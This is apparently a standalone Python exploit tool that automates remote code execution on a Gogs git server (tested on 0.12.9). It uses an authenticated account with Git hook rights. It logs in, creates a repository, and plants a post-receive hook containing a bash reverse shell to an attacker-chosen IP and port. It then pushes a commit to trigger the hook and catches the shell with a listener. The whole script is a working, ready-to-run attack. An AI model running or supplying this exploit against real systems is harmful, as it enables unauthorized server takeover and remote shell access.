#!/usr/bin/python3

import argparse
import requests
import re
import string
import random
import os
import subprocess
import pwn

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

parser = argparse.ArgumentParser(description='Tool to automate code execution on the server running Gogs git service.\n[#] Type: Post-Authenticated\n[#] Privilege: Permission to create Git hooks (Admin Panel > Users > Edit Account)\n[#] Tested: 0.12.9 ',formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument("-s","--server",help="Hostname/IP (port) (path)",required=True)
parser.add_argument("-u","--username",help="Username of the account",required=True)
parser.add_argument("-p","--password",help="Password of the account",required=True)
parser.add_argument("-r","--revshell",help="<ip>:<port>",required=True)
parser.add_argument("-t","--tls",help="true or false",default='true')

args = parser.parse_args()

# Global Variables
pattern = '_csrf=([a-zA-Z0-9\-\_=]+)'
server=args.server
username=args.username
password=args.password
ssl=''
if (args.tls == 'true'):
	ssl='https://'
else:
	ssl='http://'
temp=args.revshell
ip,port=temp.split(':')


# _csrf set in response header 'set-cookie'
# CSRF URL: http://192.168.200.224:8000
def get_csrf(*args):
	if (len(args)==1):
		r=requests.get(f'{ssl}{server}',cookies=args[0],verify=False)
		csrf=re.findall(pattern,r.headers['set-cookie'])[0]
		return csrf
	else:
		r=requests.get(f'{ssl}{server}',verify=False)
		csrf=re.findall(pattern,r.headers['set-cookie'])[0]
		return csrf


# Step 1: Login
# http://192.168.200.224:8000/user/login
def login():
	# Session cookie being set before login
	cookies=dict()
	l_pattern = 'i_like_gogs=([a-zA-Z0-9\-\_=]+)'
	r=requests.get(f'{ssl}{server}',verify=False)
	cookies['i_like_gogs']=re.findall(l_pattern,r.headers['set-cookie'])[0]
	
	data=dict()
	data['_csrf']=get_csrf()
	data['user_name']=username
	data['password']=password
	
	r=requests.post(f'{ssl}{server}/user/login',cookies=cookies,data=data,verify=False)
	
	r=requests.get(f'{ssl}{server}',cookies=cookies,verify=False)
	
	
	print(f'{bcolors.OKGREEN}[+] Login successful as {username}.{bcolors.ENDC}')
	return cookies
	

# Step 2: Create a Repository
# http://192.168.200.224:8000/repo/create
def repo(session):
	r=requests.get(f'{ssl}{server}/repo/create',cookies=session,verify=False)
	l_pattern = 'name="user_id" value="([0-9]+)"'
	user_id=re.findall(l_pattern,r.text)[0]
	
	data=dict()
	data['_csrf']=get_csrf(session)
	ran = ''.join(random.choices(string.ascii_uppercase + string.digits, k = 6))
	repository=f'TestRepo{ran}'
	data['repo_name']=repository
	data['user_id']=user_id
	data['description']=''
	data['gitignores']=''
	data['license']=''
	data['readme']='Default'
	r=requests.post(f'{ssl}{server}/repo/create',cookies=session,data=data,verify=False)
	print(f'{bcolors.OKGREEN}[+] Repository {repository} created.{bcolors.ENDC}')
	
	return repository
	
# Step 3: Creating a post commit git hook 'post-receive'
# http://192.168.200.224:8000/admin/testrepo1/settings/hooks/git/post-receive
def settings(session,repository):
	r=requests.get(f'{ssl}{server}/{username}/{repository}/settings',cookies=session,verify=False)
	if 'git hooks' in r.text.lower():
		print(f'{bcolors.OKGREEN}[+] User can create Git hooks.{bcolors.ENDC}')
		
		data=dict()
		data['_csrf']=get_csrf(session)
		revshell=f'#!/bin/bash\nbash -i >& /dev/tcp/{ip}/{port} 0>&1'
		data['content']=revshell
		r=requests.post(f'{ssl}{server}/{username}/{repository}/settings/hooks/git/post-receive',cookies=session,data=data,verify=False)
		print(f'{bcolors.OKGREEN}[+] Reverse shell commands pasted in post-receive Git hook.{bcolors.ENDC}')
		return 'True'
	else:
		return 'False'

# Step 4: Cloning the repo
# git clone 'http://192.168.200.224:8000/admin/testrepo1.git'

def automate_bash(repository):
	command=f'git clone {ssl}{server}/{username}/{repository}.git'
	os.system(command)
	
	fpipe=open('autocommit.sh','w')
	fpipe.write('#!/bin/bash\n')
	fpipe.write('ran=$(cat /dev/urandom| base64 | head -c 8)\n')
	fpipe.write('touch readme$ran.md\n')
	fpipe.write('git add readme$ran.md\n')
	fpipe.write('git commit -m "first"\n')
	fpipe.write('git push -u origin master')
	fpipe.close()
	
	fpipe=open('script.exp','w')
	fpipe.write('#!/usr/bin/expect -f\n')
	fpipe.write(f'set user "{username}"\n')
	fpipe.write(f'set pass "{password}"\n')
	fpipe.write('set timeout -1\n')
	fpipe.write('spawn ./autocommit.sh\n')
	fpipe.write('expect "Username for"\n')
	fpipe.write('send -- "$user\\r"\n')
	fpipe.write('expect "Password for"\n')
	fpipe.write('send -- "$pass\\r"\n')
	fpipe.write('expect eof\n')
	fpipe.close()
	
	os.system(f'mv autocommit.sh {repository}/')
	os.system(f'mv script.exp {repository}/')
	
	os.system(f'chmod +x {repository}/autocommit.sh')
	os.system(f'chmod +x {repository}/script.exp')
	
	print(f'{bcolors.OKGREEN}[+] Bash automation scripts created.{bcolors.ENDC}')
	
	print(f'{bcolors.OKGREEN}[+] Netcat listener setup at port {port}.{bcolors.ENDC}')
	revl=pwn.listen(port)
	print(f'{bcolors.OKGREEN}[+] Attempting Git commit using random file.{bcolors.ENDC}')
	#os.system(f'cd {repository};./script.exp 2> /dev/null 1> /dev/null ')
	subprocess.Popen([f'cd {repository};./script.exp'],shell=True)
	revl.wait_for_connection()
	revl.interactive()

# Step 5: Committing a sample file to trigger the post commit git hook 'post-receive'
# ./script2.exp

def main():
	session=login()
	repository=repo(session)
	privileges=settings(session,repository)
	if privileges == 'False':
		print(f'{bcolors.FAIL}[!] User cannot create Git hooks. Aborting!{bcolors.ENDC}')
	else:
		automate_bash(repository)
		
	
main()
	
